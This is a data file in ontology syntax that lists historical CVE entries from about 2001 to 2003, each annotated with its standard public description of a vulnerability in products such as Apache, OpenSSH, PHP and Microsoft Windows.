    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1546

    Annotations: 
        rdfs:comment "Pathways Homecare 6.5 uses weak encryption for user names and passwords, which allows local users to gain privileges by recovering the passwords from the pwhc.ini file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1550

    Annotations: 
        rdfs:comment "CentraOne 5.2 and Centra ASP with basic authentication enabled creates world-writable base64 encoded log files, which allows local users to obtain cleartext passwords from decoded log files and impersonate users."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1551

    Annotations: 
        rdfs:comment "Linux kernel 2.2.19 enables CAP_SYS_RESOURCE for setuid processes, which allows local users to exceed disk quota restrictions during execution of setuid programs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1555

    Annotations: 
        rdfs:comment "pt_chmod in Solaris 8 does not call fdetach to reset terminal privileges when users log out of terminals, which allows local users to write to other users' terminals by modifying the ACL of a TTY."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1556

    Annotations: 
        rdfs:comment "The log files in Apache web server contain information directly supplied by clients and does not filter or quote control characters, which could allow remote attackers to hide HTTP requests and spoof source IP addresses when logs are viewed with UNIX programs such as cat, tail, and grep."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1564

    Annotations: 
        rdfs:comment "setrlimit in HP-UX 10.01, 10.10, 10.24, 10.20, 11.00, 11.04 and 11.11 does not properly enforce core file size on processes after setuid or setgid privileges are dropped, which could allow local users to cause a denial of service by exhausting available disk space."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1565

    Annotations: 
        rdfs:comment "Point to Point Protocol daemon (pppd) in MacOS x 10.0 and 10.1 through 10.1.5 provides the username and password on the command line, which allows local users to obtain authentication information via the ps command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1585

    Annotations: 
        rdfs:comment "SSH protocol 2 (aka SSH-2) public key authentication in the development snapshot of OpenSSH 2.3.1, available from 2001-01-18 through 2001-02-08, does not perform a challenge-response step to ensure that the client has the proper private key, which allows remote attackers to bypass authentication as other users by supplying a public key from that user's authorized_keys file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0018

    Annotations: 
        rdfs:comment "In Microsoft Windows NT and Windows 2000, a trusting domain that receives authorization information from a trusted domain does not verify that the trusted domain is authoritative for all listed SIDs, which allows remote attackers to gain Domain Administrator privileges on the trusting domain by injecting SIDs from untrusted domains into the authorization data that comes from from the trusted domain."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0061

    Annotations: 
        rdfs:comment "Apache for Win32 before 1.3.24, and 2.0.x before 2.0.34-beta, allows remote attackers to execute arbitrary commands via shell metacharacters (a | pipe character) provided as arguments to batch (.bat) or .cmd scripts, which are sent unfiltered to the shell interpreter, typically cmd.exe."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0066

    Annotations: 
        rdfs:comment "Funk Software Proxy Host 3.x before 3.09A creates a Named Pipe that does not require authentication and is installed with insecure access control, which allows local and possibly remote users to use the Proxy Host's configuration utilities and gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0080

    Annotations: 
        rdfs:comment "rsync, when running in daemon mode, does not properly call setgroups before dropping privileges, which could provide supplemental group privileges to local users, who could then read certain files that would otherwise be disallowed."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0108

    Annotations: 
        rdfs:comment "Allaire Forums 2.0.4 and 2.0.5 and Forums! 3.0 and 3.1 allows remote authenticated users to spoof messages as other users by modifying the hidden form fields for the name and e-mail address."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0265

    Annotations: 
        rdfs:comment "Sawmill for Solaris 6.2.14 and earlier creates the AdminPassword file with world-writable permissions, which allows local users to gain privileges by modifying the file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0367

    Annotations: 
        rdfs:comment "smss.exe debugging subsystem in Windows NT and Windows 2000 does not properly authenticate programs that connect to other programs, which allows local users to gain administrator or SYSTEM privileges by duplicating a handle to a privileged process, as demonstrated by DebPloit."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0389

    Annotations: 
        rdfs:comment "Pipermail in Mailman stores private mail messages with predictable filenames in a world-executable directory, which allows local users to read private mailing list archives."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0495

    Annotations: 
        rdfs:comment "csSearch.cgi in csSearch 2.3 and earlier allows remote attackers to execute arbitrary Perl code via the savesetup command and the setup parameter, which overwrites the setup.cgi configuration file that is loaded by csSearch.cgi."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0499

    Annotations: 
        rdfs:comment "The d_path function in Linux kernel 2.2.20 and earlier, and 2.4.18 and earlier, truncates long pathnames without generating an error, which could allow local users to force programs to perform inappropriate operations on the wrong directories."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0542

    Annotations: 
        rdfs:comment "mail in OpenBSD 2.9 and 3.0 processes a tilde (~) escape character in a message even when it is not in interactive mode, which could allow local users to gain root privileges via calls to mail in cron."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0567

    Annotations: 
        rdfs:comment "Oracle 8i and 9i with PL/SQL package for External Procedures (EXTPROC) allows remote attackers to bypass authentication and execute arbitrary functions by using the TNS Listener to directly connect to the EXTPROC process."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0583

    Annotations: 
        rdfs:comment "WorkforceROI Xpede 4.1 uses a small random namespace (5 alphanumeric characters) for temporary expense claim reports in the /reports/temp directory, which allows remote attackers to read the reports via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0628

    Annotations: 
        rdfs:comment "The Telnet service for Polycom ViewStation before 7.2.4 does not restrict the number of failed login attempts, which makes it easier for remote attackers to guess usernames and passwords via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0638

    Annotations: 
        rdfs:comment "setpwnam.c in the util-linux package, as included in Red Hat Linux 7.3 and earlier, and other operating systems, does not properly lock a temporary file when modifying /etc/passwd, which may allow local users to gain privileges via a complex race condition that uses an open file descriptor in utility programs such as chfn and chsh."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0671

    Annotations: 
        rdfs:comment "Pingtel xpressa SIP-based voice-over-IP phone 1.2.5 through 1.2.7.4 downloads phone applications from a web site but can not verify the integrity of the applications, which could allow remote attackers to install Trojan horse applications via DNS spoofing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0704

    Annotations: 
        rdfs:comment "The Network Address Translation (NAT) capability for Netfilter (\"iptables\") 1.2.6a and earlier leaks translated IP addresses in ICMP error messages."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0725

    Annotations: 
        rdfs:comment "Attacker performs malicious actions on a hard link to a file, obscuring the real target file."^^xsd:string,
        rdfs:comment "NTFS file system in Windows NT 4.0 and Windows 2000 SP2 allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0764

    Annotations: 
        rdfs:comment "Phorum 3.3.2a allows remote attackers to execute arbitrary commands via an HTTP request to (1) plugin.php, (2) admin.php, or (3) del.php that modifies the PHORUM[settings_dir] variable to point to a directory that contains a PHP file with the commands."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0793

    Annotations: 
        rdfs:comment "Hard link and possibly symbolic link following vulnerabilities in QNX RTOS 4.25 (aka QNX4) allow local users to overwrite arbitrary files via (1) the -f argument to the monitor utility, (2) the -d argument to dumper, (3) the -c argument to crttrap, or (4) using the Watcom sample utility."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0862

    Annotations: 
        rdfs:comment "The (1) CertGetCertificateChain, (2) CertVerifyCertificateChainPolicy, and (3) WinVerifyTrust APIs within the CryptoAPI for Microsoft products including Microsoft Windows 98 through XP, Office for Mac, Internet Explorer for Mac, and Outlook Express for Mac, do not properly verify the Basic Constraints of intermediate CA-signed X.509 certificates, which allows remote attackers to spoof the certificates of trusted sites via a man-in-the-middle attack for SSL sessions, as originally reported for Internet Explorer and IIS."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0870

    Annotations: 
        rdfs:comment "The original patch for the Cisco Content Service Switch 11000 Series authentication bypass vulnerability (CVE-2001-0622) was incomplete, which still allows remote attackers to gain additional privileges by directly requesting the web management URL instead of navigating through the interface, possibly via a variant of the original attack, as identified by Cisco bug ID CSCdw08549."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0903

    Annotations: 
        rdfs:comment "register.php for WoltLab Burning Board (wbboard) 1.1.1 uses a small number of random values for the \"code\" parameter that is provided to action.php to approve a new registration, along with predictable new user ID's, which allows remote attackers to hijack new user accounts via a brute force attack on the new user ID and the code value."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0943

    Annotations: 
        rdfs:comment "MetaCart2.sql stores the user database under the web document root without access controls, which allows remote attackers to obtain sensitive information such as passwords and credit card numbers via a direct request for metacart.mdb."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0969

    Annotations: 
        rdfs:comment "Buffer overflow in MySQL daemon (mysqld) before 3.23.50, and 4.0 beta before 4.02, on the Win32 platform, allows local users to execute arbitrary code via a long \"datadir\" parameter in the my.ini initialization file, whose permissions on Windows allow Full Control to the Everyone group."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0970

    Annotations: 
        rdfs:comment "The SSL capability for Konqueror in KDE 3.0.2 and earlier does not verify the Basic Constraints for an intermediate CA-signed certificate, which allows remote attackers to spoof the certificates of trusted sites via a man-in-the-middle attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0985

    Annotations: 
        rdfs:comment "Argument injection vulnerability in the mail function for PHP 4.x to 4.2.2 may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) in the 5th argument to mail(), altering MTA behavior and possibly executing commands."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-0986

    Annotations: 
        rdfs:comment "The mail function in PHP 4.x to 4.2.2 does not filter ASCII control characters from its arguments, which could allow remote attackers to modify mail message content, including mail headers, and possibly use PHP as a \"spam proxy.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1145

    Annotations: 
        rdfs:comment "The xp_runwebtask stored procedure in the Web Tasks component of Microsoft SQL Server 7.0 and 2000, Microsoft Data Engine (MSDE) 1.0, and Microsoft Desktop Engine (MSDE) 2000 can be executed by PUBLIC, which allows an attacker to gain privileges by updating a webtask that is owned by the database owner through the msdb.dbo.mswebtasks table, which does not have strong permissions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1154

    Annotations: 
        rdfs:comment "anlgform.pl in Analog before 5.23 does not restrict access to the PROGRESSFREQ progress update command, which allows remote attackers to cause a denial of service (disk consumption) by using the command to report updates more frequently and fill the web server error log."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1374

    Annotations: 
        rdfs:comment "The COM_CHANGE_USER command in MySQL 3.x before 3.23.54, and 4.x before 4.0.6, allows remote attackers to gain privileges via a brute force attack using a one-character password, which causes MySQL to only compare the provided password against the first character of the real password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1446

    Annotations: 
        rdfs:comment "The error checking routine used for the C_Verify call on a symmetric verification key in the nCipher PKCS#11 library 1.2.0 and later returns the CKR_OK status even when it detects an invalid signature, which could allow remote attackers to modify or forge messages."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1449

    Annotations: 
        rdfs:comment "eUpload 1.0 stores the password.txt password file in plaintext under the web document root, which allows remote attackers to overwrite arbitrary files by reading password.txt."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1484

    Annotations: 
        rdfs:comment "DB4Web server, when configured to use verbose debug messages, allows remote attackers to use DB4Web as a proxy and attempt TCP connections to other systems (port scan) via a request for a URL that specifies the target IP address and port, which produces a connection status in the resulting error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1578

    Annotations: 
        rdfs:comment "The default installation of SAP R/3, when using Oracle and SQL*net V2 3.x, 4.x, and 6.10, allows remote attackers to obtain arbitrary, sensitive SAP data by directly connecting to the Oracle database and executing queries against the database, which is not password-protected."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1646

    Annotations: 
        rdfs:comment "SSH Secure Shell for Servers 3.0.0 to 3.1.1 allows remote attackers to override the AllowedAuthentications configuration and use less secure authentication schemes (e.g. password) than configured for the server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1657

    Annotations: 
        rdfs:comment "PostgreSQL uses the username for a salt when generating passwords, which makes it easier for remote attackers to guess passwords via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1671

    Annotations: 
        rdfs:comment "Microsoft Internet Explorer 5.0, 5.01, and 5.5 allows remote attackers to monitor the contents of the clipboard via the getData method of the clipboardData object."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1682

    Annotations: 
        rdfs:comment "NewsReactor 1.0 uses a weak encryption scheme, which could allow local users to decrypt the passwords and gain access to other users' newsgroup accounts."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1688

    Annotations: 
        rdfs:comment "The browser history feature in Microsoft Internet Explorer 5.5 through 6.0 allows remote attackers to execute arbitrary script as other users and steal authentication information via cookies by injecting JavaScript into the URL, which is executed when the user hits the Back button."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1694

    Annotations: 
        rdfs:comment "Microsoft Internet Information Server (IIS) 4.0 opens log files with FILE_SHARE_READ and FILE_SHARE_WRITE permissions, which could allow remote attackers to modify the log file contents while IIS is running."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1696

    Annotations: 
        rdfs:comment "Microsoft Outlook plug-in PGP version 7.0, 7.0.3, and 7.0.4 silently saves a decrypted copy of a message to hard disk when \"Automatically decrypt/verify when opening messages\" option is checked, \"Always use Secure Viewer when decrypting\" option is not checked, and the user replies to an encrypted message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1697

    Annotations: 
        rdfs:comment "Electronic Code Book (ECB) mode in VTun 2.0 through 2.5 uses a weak encryption algorithm that produces the same ciphertext from the same plaintext blocks, which could allow remote attackers to gain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1704

    Annotations: 
        rdfs:comment "Zeroboard 4.1, when the \"allow_url_fopen\" and \"register_globals\" variables are enabled, allows remote attackers to execute arbitrary PHP code by modifying the _zb_path parameter to reference a URL on a remote web server that contains the code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1706

    Annotations: 
        rdfs:comment "Cisco IOS software 11.3 through 12.2 running on Cisco uBR7200 and uBR7100 series Universal Broadband Routers allows remote attackers to modify Data Over Cable Service Interface Specification (DOCSIS) settings via a DOCSIS file without a Message Integrity Check (MIC) signature, which is approved by the router."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1707

    Annotations: 
        rdfs:comment "install.php in phpBB 2.0 through 2.0.1, when \"allow_url_fopen\" and \"register_globals\" variables are set to \"on\", allows remote attackers to execute arbitrary PHP code by modifying the phpbb_root_dir parameter to reference a URL on a remote web server that contains the code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1711

    Annotations: 
        rdfs:comment "BasiliX 1.1.0 saves attachments in a world readable /tmp/BasiliX directory, which allows local users to read other users' attachments."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1713

    Annotations: 
        rdfs:comment "The Standard security setting for Mandrake-Security package (msec) in Mandrake 8.2 installs home directories with world-readable permissions, which could allow local users to read other user's files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1730

    Annotations: 
        rdfs:comment "ASPjar Guestbook 1.00 allows remote attackers to delete arbitrary messages accessing the delete.asp administrative script with certain cookie values set to \"true\"."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1734

    Annotations: 
        rdfs:comment "NewsPro 1.01 allows remote attackers to gain unauthorized administrator access by setting their authentication cookie to \"logged,true\"."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1739

    Annotations: 
        rdfs:comment "Alt-N Technologies Mdaemon 5.0 through 5.0.6 uses a weak encryption algorithm to store user passwords, which allows local users to crack passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1750

    Annotations: 
        rdfs:comment "csGuestbook.cgi in CGISCRIPT.NET csGuestbook 1.0 allows remote attackers to execute arbitrary Perl code via the setup parameter, which is processed by the Perl eval function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1752

    Annotations: 
        rdfs:comment "csChatRBox.cgi in CGIScript.net csChat-R-Box allows remote attackers to execute arbitrary Perl code via the setup parameter, which is processed by the Perl eval function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1753

    Annotations: 
        rdfs:comment "csNewsPro.cgi in CGIScript.net csNews Professional (csNewsPro) allows remote attackers to execute arbitrary Perl code via the setup parameter, which is processed by the Perl eval function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1770

    Annotations: 
        rdfs:comment "Qualcomm Eudora 5.1 allows remote attackers to execute arbitrary code via an HTML e-mail message that uses a file:// URL in a t:video tag to reference an attached Windows Media Player file containing JavaScript code, which is launched and executed in the My Computer zone by Internet Explorer."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1771

    Annotations: 
        rdfs:comment "Matt Wright FormMail 1.9 and earlier allows remote attackers to send spam or anonymous e-mail by injecting a newline character followed by CC:, BCC:, or additional TO: fields in the email and realname CGI variables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1772

    Annotations: 
        rdfs:comment "Novell Netware 5.0 through 5.1 may allow local users to gain \"Domain Admin\" rights by logging into a Novell Directory Services (NDS) account, and executing \"net use\" on an NDS_ADM account that is not in the NT domain but has domain access rights, which allows the user to enter a null password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1783

    Annotations: 
        rdfs:comment "CRLF injection vulnerability in PHP 4.2.1 through 4.2.3, when allow_url_fopen is enabled, allows remote attackers to modify HTTP headers for outgoing requests by causing CRLF sequences to be injected into arguments that are passed to the (1) fopen or (2) file functions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1786

    Annotations: 
        rdfs:comment "SGI IRIX 6.5 through 6.5.14 applies a umask of 022 to root core dumps, which allows local users to read the core dumps and possibly obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1796

    Annotations: 
        rdfs:comment "ChaiVM EZloader for HP color LaserJet 4500 and 4550 and HP LaserJet 4100 and 8150 does not properly verify JAR signatures for new services, which allows local users to load unauthorized Chai services."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1798

    Annotations: 
        rdfs:comment "MidiCart PHP, PHP Plus, and PHP Maxi allows remote attackers to (1) upload arbitrary php files via a direct request to admin/upload.php or (2) access sensitive information via a direct request to admin/credit_card_info.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1800

    Annotations: 
        rdfs:comment "phpRank 1.8 stores the administrative password in plaintext on the server and in the \"ap\" cookie, which allows remote attackers to retrieve the administrative password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1810

    Annotations: 
        rdfs:comment "D-Link DWL-900AP+ Access Point 2.1 and 2.2 allows remote attackers to access the TFTP server without authentication and read the config.img file, which contains sensitive information such as the administrative password, the WEP encryption keys, and network configuration information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1839

    Annotations: 
        rdfs:comment "Trend Micro InterScan VirusWall for Windows NT 3.52 does not record the sender's IP address in the headers for a mail message when it is passed from VirusWall to the MTA, which allows remote attackers to hide the origin of the message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1841

    Annotations: 
        rdfs:comment "The document management module in NOLA 1.1.1 and 1.1.2 does not restrict the types of files that are uploaded, which allows remote attackers to upload and execute arbitrary PHP files with extensions such as .php4."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1844

    Annotations: 
        rdfs:comment "Microsoft Windows Media Player (WMP) 6.3, when installed on Solaris, installs executables with world-writable permissions, which allows local users to delete or modify the executables to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1848

    Annotations: 
        rdfs:comment "TightVNC before 1.2.4 running on Windows stores unencrypted passwords in the password text control of the WinVNC Properties dialog, which could allow local users to access passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1863

    Annotations: 
        rdfs:comment "Iomega Network Attached Storage (NAS) A300U, and possibly other models, does not allow the FTP service to be disabled, which allows local users to access home directories via FTP even when access to all shared directories have been disabled."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1872

    Annotations: 
        rdfs:comment "Microsoft SQL Server 6.0 through 2000, with SQL Authentication enabled, uses weak password encryption (XOR), which allows remote attackers to sniff and decrypt the password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1880

    Annotations: 
        rdfs:comment "LokwaBB 1.2.2 allows remote attackers to read arbitrary messages by modifying the pmid parameter to pm.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1898

    Annotations: 
        rdfs:comment "Terminal 1.3 in Apple Mac OS X 10.2 allows remote attackers to execute arbitrary commands via shell metacharacters in a telnet:// link, which is executed by Terminal.app window."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1910

    Annotations: 
        rdfs:comment "Click2Learn Ingenium Learning Management System 5.1 and 6.1 uses weak encryption for passwords (reversible algorithm), which allows attackers to obtain passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1946

    Annotations: 
        rdfs:comment "Videsh Sanchar Nigam Limited (VSNL) Integrated Dialer Software 1.2.000, when the \"Save Password\" option is used, stores the password with a weak encryption scheme (one-to-one mapping) in a registry key, which allows local users to obtain and decrypt the password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1949

    Annotations: 
        rdfs:comment "The Network Attached Storage (NAS) Administration Web Page for Iomega NAS A300U transmits passwords in cleartext, which allows remote attackers to sniff the administrative password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1975

    Annotations: 
        rdfs:comment "Sharp Zaurus PDA SL-5000D and SL-5500 uses a salt of \"A0\" to encrypt the screen-locking password as stored in the Security.conf file, which makes it easier for local users to guess the password via brute force methods."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-1981

    Annotations: 
        rdfs:comment "Microsoft SQL Server 2000 through SQL Server 2000 SP2 allows the \"public\" role to execute the (1) sp_MSSetServerProperties or (2) sp_MSsetalertinfo stored procedures, which allows attackers to modify configuration including SQL server startup and alert settings."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-2042

    Annotations: 
        rdfs:comment "ptrace in the QNX realtime operating system (RTOS) 4.25 and 6.1.0 allows programs to attach to privileged processes, which could allow local users to execute arbitrary code by modifying running processes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-2054

    Annotations: 
        rdfs:comment "TeeKai Forum 1.2 allows remote attackers to authenticate as the administrator and and gain privileged web forum access by setting the valid_level cookie to admin."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-2058

    Annotations: 
        rdfs:comment "TeeKai Tracking Online 1.0 uses weak encryption of web usage statistics in data/userlog/log.txt, which allows remote attackers to identify IP's visiting the site by dividing each octet by the MD5 hash of '20'."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-2064

    Annotations: 
        rdfs:comment "isadmin.php in PhpWebGallery 1.0 allows remote attackers to gain administrative access via by setting the photo_login cookie to pseudo."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2002-2323

    Annotations: 
        rdfs:comment "Sun PC NetLink 1.0 through 1.2 does not properly set the access control list (ACL) for files and directories that use symbolic links and have been restored from backup, which could allow local or remote attackers to bypass intended access restrictions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0020

    Annotations: 
        rdfs:comment "Apache does not filter terminal escape sequences from its error logs, which could make it easier for attackers to insert those sequences into terminal emulators containing vulnerabilities related to escape sequences."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0021

    Annotations: 
        rdfs:comment "The \"screen dump\" feature in Eterm 0.9.1 and earlier allows attackers to overwrite arbitrary files via a certain character escape sequence when it is echoed to a user's terminal, e.g. when the user views a file containing the malicious sequence."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0022

    Annotations: 
        rdfs:comment "The \"screen dump\" feature in rxvt 2.7.8 allows attackers to overwrite arbitrary files via a certain character escape sequence when it is echoed to a user's terminal, e.g. when the user views a file containing the malicious sequence."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0023

    Annotations: 
        rdfs:comment "The menuBar feature in rxvt 2.7.8 allows attackers to modify menu options and execute arbitrary commands via a certain character escape sequence that inserts the commands into the menu."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0041

    Annotations: 
        rdfs:comment "Kerberos FTP client allows remote FTP sites to execute arbitrary code via a pipe (|) character in a filename that is retrieved by the client."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0063

    Annotations: 
        rdfs:comment "The xterm terminal emulator in XFree86 4.2.0 and earlier allows attackers to modify the window title via a certain character escape sequence and then insert it back to the command line in the user's terminal, e.g. when the user views a file containing the malicious sequence, which could allow the attacker to execute arbitrary commands."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0078

    Annotations: 
        rdfs:comment "ssl3_get_record in s3_pkt.c for OpenSSL before 0.9.7a and 0.9.6 before 0.9.6i does not perform a MAC computation if an incorrect block cipher padding is used, which causes an information leak (timing discrepancy) that may make it easier to launch cryptographic attacks that rely on distinguishing between padding and MAC verification errors, possibly leading to extraction of the original plaintext, aka the \"Vaudenay timing attack.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0083

    Annotations: 
        rdfs:comment "Apache 1.3 before 1.3.25 and Apache 2.0 before version 2.0.46 does not filter terminal escape sequences from its access logs, which could make it easier for attackers to insert those sequences into terminal emulators containing vulnerabilities related to escape sequences, a different vulnerability than CVE-2003-0020."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0174

    Annotations: 
        rdfs:comment "The LDAP name service (nsd) in IRIX 6.5.19 and earlier does not properly verify if the USERPASSWORD attribute has been provided by an LDAP server, which could allow attackers to log in without a password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0190

    Annotations: 
        rdfs:comment "OpenSSH-portable (OpenSSH) 3.6.1p1 and earlier with PAM support enabled immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0291

    Annotations: 
        rdfs:comment "3com OfficeConnect Remote 812 ADSL Router 1.1.7 does not properly clear memory from DHCP responses, which allows remote attackers to identify the contents of previous HTTP requests by sniffing DHCP packets."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0304

    Annotations: 
        rdfs:comment "one||zero (aka One or Zero) Helpdesk 1.4 rc4 allows remote attackers to create administrator accounts by directly calling the install.php Helpdesk Installation script."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0317

    Annotations: 
        rdfs:comment "iisPROTECT 2.1 and 2.2 allows remote attackers to bypass authentication via an HTTP request containing URL-encoded characters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0355

    Annotations: 
        rdfs:comment "Safari 1.0 Beta 2 (v73) and earlier does not validate the Common Name (CN) field for X.509 Certificates, which could allow remote attackers to spoof certificates."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0377

    Annotations: 
        rdfs:comment "SQL injection vulnerability in the web-based administration interface for iisPROTECT 2.2-r4, and possibly earlier versions, allows remote attackers to insert arbitrary SQL and execute code via certain variables, as demonstrated using the GroupName variable in SiteAdmin.ASP."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0395

    Annotations: 
        rdfs:comment "Ultimate PHP Board (UPB) 1.9 allows remote attackers to execute arbitrary PHP code with UPB administrator privileges via an HTTP request containing the code in the User-Agent header, which is executed when the administrator executes admin_iplog.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2003-0489

    Annotations: 
